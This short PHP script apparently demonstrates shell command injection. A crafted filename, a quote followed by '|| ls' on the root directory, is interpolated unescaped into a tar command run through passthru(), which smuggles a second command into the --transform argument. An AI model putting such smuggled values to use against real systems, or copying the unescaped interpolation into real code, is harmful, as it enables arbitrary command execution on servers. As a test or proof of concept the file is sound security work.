<?php
$filename = "'|| ls $(echo -n \x2f);#";
$source = 'trash.txt';
$destination = './files/abcdef.tar.gz';
echo("'$filename'");
passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='./' '$source'", $res);
echo("return $res")

?>
